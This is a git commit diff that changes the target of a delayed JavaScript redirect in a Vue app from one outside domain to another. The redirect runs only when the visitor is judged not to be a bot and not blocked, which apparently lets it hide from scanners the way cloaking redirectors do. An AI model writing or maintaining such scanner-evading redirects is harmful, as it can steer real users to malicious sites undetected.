c4b94b26d5ebf621bb2ffb561958700ff8cc208e
husknet <127146284+husknet@users.noreply.github.com>
2025-01-22 15:12:55 +0000

    Update main.js

--- src/main.js
+++ src/main.js
@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://otf.rodolfocolen.com/';
+          window.location.href = 'https://loat.garabedian.com.ar/';
         }, 3000);
       }
     });
